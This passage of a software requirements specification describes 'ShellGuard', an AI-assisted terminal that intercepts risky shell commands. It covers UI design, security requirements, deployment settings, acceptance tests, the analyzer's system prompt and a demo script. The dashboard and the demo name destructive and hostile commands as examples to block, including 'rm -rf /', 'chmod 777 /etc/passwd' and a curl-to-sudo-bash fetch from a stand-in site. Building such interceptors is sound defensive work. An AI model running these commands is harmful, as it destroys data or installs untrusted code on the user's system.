│ │ 4. docker prune ████████░░░░░░░░░░░░░░░░░░░░░ 4 times │ │
│ │ 5. git push -f ██████░░░░░░░░░░░░░░░░░░░░░░░ 3 times │ │
│ └───────────────────────────────────────────────────────────────────────┘ │
│ │
│ ┌───────────────────────────────────────────────────────────────────────┐ │
│ │ Recent Interceptions │ │
│ │ │ │
│ │ Time │ Command │ Risk │ Action │ Latency │ │
│ │ ──────────┼──────────────────────┼────────┼─────────────┼───────── │ │
│ │ 2m ago │ rm -rf /var/logs/\* │ 🟠 High│ 🔄 Safe Swap│ 1.2s │ │
│ │ 5m ago │ chmod 777 /etc/nginx │ 🟠 High│ ❌ Cancelled│ 0.9s │ │
│ │ 12m ago │ kill -9 $(pgrep pg) │ 🟠 High│ ⚠️ Approved│ 1.5s │ │
│ │ 15m ago │ curl ... | sudo bash │ 🔴 Crit│ 🚫 Blocked │ 0.0s │ │
│ └───────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────────┘
9.3 Color Scheme
Element Color (Hex) Usage
Background (terminal) #0a0a0a Terminal background
Background (UI) #09090b App background (zinc-950)
Surface #18181b Cards, panels (zinc-900)
Border #27272a Dividers, borders (zinc-800)
Text Primary #fafafa Main text (zinc-50)
Text Secondary #a1a1aa Secondary text (zinc-400)
Terminal Cursor #00ff88 Blinking cursor
Brand/Shield #22c55e ShellGuard logo, safe indicators (green-500)
Critical Risk #ef4444 Critical badges, blocks (red-500)
Critical Background #450a0a Critical warning overlay bg (red-950)
High Risk #f97316 High risk badges (orange-500)
High Background #431407 High warning overlay bg (orange-950)
Medium Risk #eab308 Medium risk badges (yellow-500)
Medium Background #422006 Medium warning overlay bg (yellow-950)
Low Risk #3b82f6 Low risk badges (blue-500)
Safe #22c55e Safe badges, alternatives (green-500)
Safe Background #052e16 Safe alternative box bg (green-950)
Approve Button #dc2626 "Proceed Anyway" button (red-600)
Safe Alt Button #16a34a "Use Safe Alternative" button (green-600)
Cancel Button #3f3f46 "Cancel" button (zinc-700)
9.4 Typography
Element Font Size Weight
Terminal text JetBrains Mono / Fira Code 14px 400
Command in warning JetBrains Mono 14px 400
Warning title Inter / System 18px 700
Warning body Inter / System 14px 400
Header brand Inter / System 16px 700
Stats labels Inter / System 12px 500
Stats values Inter / System 18px 700
Badge text Inter / System 11px 600
History entries Inter / System 13px 400
9.5 Key Interactions
Keyboard Shortcuts (during warning overlay):

Key Action
Enter Approve (execute original command)
s Use safe alternative
Escape Cancel
e Explain more
Animations:

Element Animation Duration
Warning overlay appear Fade in + scale up 200ms
Warning overlay dismiss Fade out + scale down 150ms
Analyzing indicator Pulse 1.5s loop
Risk bars fill Width transition 500ms ease-out
History entry appear Slide in from right 200ms
Stats counter update Number count-up 300ms
Blocked command shake Horizontal shake 400ms 10. Security Requirements
SR-001: No Auto-Execution

The system SHALL NEVER execute a command classified as medium risk or higher without explicit user confirmation
Hard-blocked commands SHALL NEVER be executable, even with user confirmation (unless confirmation phrase is typed)
SR-002: PTY Isolation

The PTY session SHALL run as the same user that started the backend process
The PTY SHALL NOT run as root unless the backend is explicitly started as root
The system SHALL document the security implications of the PTY's privilege level
SR-003: Input Sanitization

All WebSocket messages SHALL be validated against expected schemas before processing
Malformed WebSocket messages SHALL be ignored and logged
The system SHALL prevent prompt injection attacks through crafted command strings
SR-004: Output Safety

AI-generated "safer alternatives" SHALL be validated through the pattern matcher before being suggested
If the alternative fails safety validation, it SHALL NOT be suggested
The system SHALL NEVER generate a "safer alternative" that is actually more dangerous
SR-005: Secrets Protection

API keys SHALL be stored only in environment variables
API keys SHALL NEVER appear in frontend code, browser console, or WebSocket messages
Database SHALL NOT store API keys or secrets
SR-006: WebSocket Security

In production, WebSocket connections SHALL use WSS (TLS)
WebSocket connections SHALL have idle timeout (30 minutes)
The system SHALL limit to one terminal session per WebSocket connection
SR-007: CORS

CORS SHALL be configured to allow only the frontend origin
Wildcard CORS (\*) SHALL only be used in development mode 11. Observability & Monitoring
11.1 Health Check
JSON

// GET /api/health
{
"status": "healthy",
"timestamp": "2025-02-15T10:30:00Z",
"components": {
"pty": { "status": "healthy" },
"llm_api": { "status": "healthy", "provider": "gemini", "latency_ms": 230 },
"archestra_runtime": { "status": "healthy" },
"database": { "status": "healthy" },
"pattern_registry": { "status": "healthy", "patterns_loaded": 52 }
},
"active_sessions": 1,
"uptime_seconds": 3600
}
11.2 Key Metrics (Exposed via Archestra + /api/stats)
Metric Type Significance
Total commands processed Counter Usage volume
Commands by risk level Counter (labeled) Risk distribution
Commands by action taken Counter (labeled) User behavior
Safe swap rate Gauge Product effectiveness
Analysis latency (histogram) Histogram Performance tracking
Tokens consumed Counter Cost tracking
Active sessions Gauge Concurrent usage
Pattern match rate vs AI analysis rate Gauge Efficiency of two-tier system 12. Deployment Requirements
12.1 Docker Configuration
YAML

# docker-compose.yml

version: '3.8'

services:
backend:
build: ./backend
ports: - "8000:8000"
environment: - GEMINI_API_KEY=${GEMINI_API_KEY}
      - ARCHESTRA_API_KEY=${ARCHESTRA_API_KEY} - ARCHESTRA_RUNTIME_URL=${ARCHESTRA_RUNTIME_URL} - APP_ENV=production - DATABASE_PATH=/data/shellguard.db
volumes: - app_data:/data
privileged: false
security_opt: - no-new-privileges:true

frontend:
build: ./frontend
ports: - "3000:3000"
environment: - NEXT_PUBLIC_WS_URL=ws://localhost:8000/ws/terminal - NEXT_PUBLIC_API_URL=http://localhost:8000/api
depends_on: - backend

volumes:
app_data:
12.2 Environment Variables
Bash

# .env.example

# ===== APPLICATION =====

APP_ENV=development # development | production
APP_PORT=8000

# ===== LLM =====

GEMINI_API_KEY=your-gemini-api-key-here
LLM_MODEL=gemini-1.5-flash # Primary model (fast + cheap)
LLM_FALLBACK_MODEL=gemini-1.5-pro # Fallback model (better quality)
LLM_TEMPERATURE=0.1
LLM_MAX_TOKENS=800

# ===== ARCHESTRA =====

ARCHESTRA_API_KEY=...
ARCHESTRA_RUNTIME_URL=https://runtime.archestra.dev
ARCHESTRA_PROJECT_ID=shellguard
ARCHESTRA_OBSERVABILITY_ENABLED=true
ARCHESTRA_GUARDRAILS_ENABLED=true

# ===== DATABASE =====

DATABASE_PATH=./data/shellguard.db

# ===== FRONTEND =====

NEXT_PUBLIC_WS_URL=ws://localhost:8000/ws/terminal
NEXT_PUBLIC_API_URL=http://localhost:8000/api

# ===== SECURITY =====

CORS_ORIGINS=http://localhost:3000
WS_IDLE_TIMEOUT_SECONDS=1800 13. Constraints & Assumptions
13.1 Constraints
ID Constraint Mitigation
C-01 PTY only works on Unix/Linux/macOS Document requirement; use Linux container for deployment
C-02 Single-user terminal per session Acceptable for hackathon MVP
C-03 Hackathon time limit (~12 hours active) Strict MVP focus, feature priority list
C-04 LLM API costs Use gemini-1.5-flash (cheap), cache results, pattern matching pre-filter
C-05 LLM latency (1-3s) Only invoke AI for medium+ risk; safe commands instant
C-06 New project requirement All code written during hackathon
C-07 Command buffering complexity Support basic buffering; complex readline shortcuts may not be fully captured
13.2 Assumptions
ID Assumption Risk if Invalid
A-01 xterm.js provides reliable terminal emulation Core feature fails; would need alternative terminal library
A-02 Python PTY module works reliably in container Terminal backend fails; test early
A-03 Gemini API has acceptable latency (< 3s) Warnings feel slow; show loading state, have cached fallbacks
A-04 Archestra SDK integrates smoothly with FastAPI Integration pain; start Archestra setup early
A-05 Pattern matching catches 80%+ of dangerous commands False negatives; expand pattern list, rely on AI as backup
A-06 Single WebSocket connection handles both terminal I/O and control messages May need message type routing; already designed for this 14. Acceptance Criteria
14.1 Must-Have (Demo Blockers)
ID Criterion Test
AC-01 Terminal opens and shows bash prompt Navigate to app, see user@host:~$
AC-02 Safe commands execute instantly with no delay Type ls -la, pwd, echo hello — immediate output
AC-03 Dangerous commands show warning overlay Type rm -rf /var/logs — warning appears
AC-04 Warning shows risk level, explanation, consequences Visual inspection of overlay content
AC-05 Warning shows risk breakdown bars Three bars visible with correct percentages
AC-06 Warning shows safer alternative Green box with alternative command visible
AC-07 "Use Safe Alternative" executes the safe command Click button, see safe command execute
AC-08 "Approve" executes the original dangerous command Click button, see original execute
AC-09 "Cancel" aborts without executing anything Click button, return to prompt
AC-10 Catastrophic commands are hard-blocked Type rm -rf / — blocked with no approve option
AC-11 Command history updates in side panel Each command appears in history list
AC-12 Stats update in header Numbers increment with each command
AC-13 Archestra MCP tools are registered and invoked Verify in Archestra dashboard
AC-14 Archestra guardrails are active Test: AI alternative is validated for safety
AC-15 Archestra observability captures traces Check Archestra tracing dashboard
14.2 Nice-to-Have (Stretch Goals)
ID Criterion Priority
SG-01 Analytics dashboard page (/dashboard) High
SG-02 "Explain More" feature with command breakdown High
SG-03 Keyboard shortcuts in warning overlay Medium
SG-04 Warning overlay animations Medium
SG-05 Persistent history across sessions Medium
SG-06 Multiple concurrent terminal sessions Low
SG-07 Custom pattern configuration UI Low 15. Risk Analysis
ID Risk Likelihood Impact Mitigation
R-01 PTY doesn't work in deployment environment Medium Critical Test PTY in Docker early; have recording fallback
R-02 xterm.js rendering issues Low High Use stable version; test on Chrome/Firefox
R-03 Gemini API down during demo Low High Pre-cache 5 demo analyses; pattern matching still works
R-04 Command buffering misses edge cases Medium Medium Focus on common cases; complex readline not required
R-05 AI generates unsafe "safe" alternatives Medium High Guardrails validate alternatives through pattern matcher
R-06 WebSocket connection drops during demo Low Medium Auto-reconnect; show reconnecting indicator
R-07 Analysis latency too high (> 5s) Medium Medium Use gemini-1.5-flash; show loading state; pattern match instantly
R-08 Archestra integration issues Medium High Start integration early; have standalone fallback
R-09 Scope creep High Medium Strict adherence to AC list; no features beyond must-haves until all pass
R-10 Frontend takes too long to build Medium Medium Use shadcn/ui components; function over form 16. Appendices
Appendix A: AI System Prompt
text

You are ShellGuard, an AI terminal safety assistant. Your job is to analyze
shell commands and assess their risk level before they are executed.

You must respond with a JSON object following this exact schema:

{
"risk_level": "critical" | "high" | "medium" | "low",
"risk_score": <integer 0-100>,
"allow": <boolean - your recommendation>,
"title": "<short risk title, max 50 chars>",
"explanation": "<detailed explanation of what the command does and why
it's risky, 2-3 sentences>",
"consequences": ["<consequence 1>", "<consequence 2>", ...],
"safer_alternative": "<a safer command that achieves a similar goal,
or null if no safe alternative exists>",
"alternative_explanation": "<why the alternative is safer, 1 sentence>",
"data_loss_risk": <integer 0-100>,
"service_impact_risk": <integer 0-100>,
"reversibility": <integer 0-100, where 100 = fully reversible>,
"requires_sudo": <boolean>,
"affected_scope": "<what files/services/systems are affected>",
"command_breakdown": [
{
"part": "<command component>",
"meaning": "<what this part does>",
"risk_contribution": "<how this part contributes to the risk>"
}
]
}

Guidelines:

- Be accurate and specific about what the command does
- Consider the COMBINATION of flags (rm -rf is worse than rm -r)
- Consider the TARGET path (deleting /tmp is less risky than /etc)
- Always suggest a safer alternative when possible
- The safer alternative should achieve a SIMILAR goal, not a completely
  different one
- If no safe alternative exists, set safer_alternative to null
- Be concise but thorough in explanations
- Consider whether the operation is reversible
- Factor in whether running as root amplifies the risk

Risk Score Guidelines:

- 0-20: Low risk, generally safe
- 21-50: Medium risk, could cause issues
- 51-80: High risk, likely to cause damage
- 81-100: Critical risk, catastrophic potential
  Appendix B: Demo Script
  text

DEMO: ShellGuard — AI Terminal Safety Copilot (5-7 minutes)
═══════════════════════════════════════════════════════════

[0:00 — OPENING]
"Every engineer has a horror story about running the wrong
command in production. A misplaced space, a wrong directory,
and suddenly your database is gone. ShellGuard prevents
those stories from happening."

[0:30 — SAFE COMMANDS]
Show: type several safe commands
$ ls -la
$ pwd
$ echo "Hello World"
$ cd /tmp
$ cat /etc/hostname

"Notice: zero delay. Safe commands pass through instantly.
ShellGuard is invisible until you need it."

[1:00 — FIRST INTERCEPTION (HIGH RISK)]
Type: rm -rf /var/log/nginx/\*

"Now watch what happens with a dangerous command."

Show warning overlay:

- Point out risk score (78/100)
- Walk through consequences
- Show risk breakdown bars
- Highlight the safer alternative

Click "Use Safe Alternative"
"It suggested using find to delete only old logs instead
of nuking the entire directory."

[2:00 — SECOND INTERCEPTION (CRITICAL)]
Type: chmod 777 /etc/passwd

Show warning overlay:

- Point out CRITICAL badge
- "This would make your password file world-writable"
- "Anyone could modify user credentials"

Click "Cancel"
"Sometimes the right choice is to just not do it."

[3:00 — HARD BLOCK]
Type: rm -rf /

Show BLOCKED overlay (no approve option):
"Some commands are so catastrophic that ShellGuard won't
let you run them, period. No approve button. No override."

[3:30 — PIPE-TO-BASH ATTACK]
Type: curl http://sketchy-site.com/install.sh | sudo bash

Show warning:
"ShellGuard catches sophisticated attack patterns too.
Piping untrusted content to sudo bash is a classic
vector for supply chain attacks."

Click "Cancel"

[4:00 — SHOW HISTORY & STATS]
Point to side panel:

- "Every command is logged with its risk assessment"
- "We've processed 8 commands, intercepted 4, and the
  user chose the safe alternative twice"
- "65% safe swap rate — ShellGuard is teaching good habits"

[4:30 — SHOW ARCHESTRA INTEGRATION]
"Under the hood, this is powered by Archestra's platform:"

- "MCP orchestrates three AI agents: risk analyzer,
  alternative suggester, and command explainer"
- "Guardrails ensure the AI never suggests a dangerous
  alternative — every suggestion goes through safety
  validation"
- "Observability tracks every analysis: latency, token
  costs, risk distributions"

Show Archestra dashboard if available.

[5:30 — CLOSING]
"ShellGuard: Think before you execute.

Every `rm -rf` story starts the same way — someone
typing too fast. ShellGuard adds a moment of clarity
between intent and execution.

Zero delay for safe commands. Instant protection for
dangerous ones. AI-powered understanding of what your
commands actually do."
Appendix C: Build Checklist
text

PRE-HACKATHON (Ready before start)
────────────────────────────────────
☐ This SRS document completed
☐ UI wireframes sketched
☐ Archestra account created and SDK docs reviewed
☐ Gemini API key ready
☐ Development environment ready (Python 3.11+, Node 20+)
☐ Demo script rehearsed mentally

HOUR 0-1: SETUP
────────────────
☐ Initialize git repo
☐ Backend: FastAPI skeleton, requirements.txt, .env
☐ Frontend: Next.js + shadcn/ui + xterm.js installed
☐ Verify xterm.js renders in browser
☐ Verify Python PTY creates bash session

HOUR 1-3: TERMINAL + INTERCEPTION
──────────────────────────────────
☐ WebSocket connection between frontend and backend
☐ Keystrokes flow: browser → backend → PTY → browser
☐ Command buffer captures current line input
☐ Enter key triggers interception (not direct PTY execution)
☐ Safe commands pass through instantly
☐ Pattern matcher implemented with 30+ patterns

HOUR 3-5: AI ANALYSIS + WARNINGS
─────────────────────────────────
☐ AI analyzer calls Gemini with structured prompt
☐ JSON response parsed and validated
☐ Warning overlay component renders in frontend
☐ Risk bars display correctly
☐ Safer alternative displayed in green box
☐ Three action buttons work (approve, safe alt, cancel)
☐ Hard block works for catastrophic commands

HOUR 5-7: ARCHESTRA INTEGRATION
────────────────────────────────
☐ 3 MCP tools registered (analyze, suggest, explain)
☐ Guardrails configured (alternative validation, PII scrub)
☐ Observability captures command traces
☐ Observability tracks metrics (commands, risks, tokens)
☐ All agent calls route through Archestra runtime

HOUR 7-9: HISTORY + POLISH
───────────────────────────
☐ Command history panel displays and updates
☐ Stats bar in header updates in real-time
☐ SQLite database stores command history
☐ Loading/analyzing state displays correctly
☐ Error states handled gracefully

HOUR 9-11: DASHBOARD + FINAL POLISH
────────────────────────────────────
☐ Dashboard page with stats cards
☐ Risk distribution visualization
☐ Recent interceptions table
☐ Dark theme consistent and polished
☐ Keyboard shortcuts in warning overlay

HOUR 11-13: DEMO PREP
──────────────────────
☐ 5 demo commands tested and working perfectly
☐ Pre-cache AI responses for demo commands (fallback)
☐ Demo script practiced 3 times
☐ README.md written
☐ Screen recording as backup
☐ Deployment to Archestra or Docker verified
☐ Final git commit and push

Appendix D: Competitive Differentiation
Feature ShellGuard rbash sudoers Warp AI Traditional
AI-powered understanding ✅ ❌ ❌ Partial ❌
Contextual explanations ✅ ❌ ❌ ✅ ❌
Safer alternative suggestions ✅ ❌ ❌ ❌ ❌
Risk scoring ✅ ❌ ❌ ❌ ❌
Visual risk breakdown ✅ ❌ ❌ ❌ ❌
Audit trail ✅ ❌ ✅ ❌ ❌
Zero config required ✅ ❌ ❌ ❌ ✅
Educational (teaches safe practices) ✅ ❌ ❌ Partial ❌
Works with any command/tool ✅ ❌ Partial ✅ ✅
Non-blocking for safe commands ✅ N/A N/A ✅ ✅

End of Software Requirements Specification
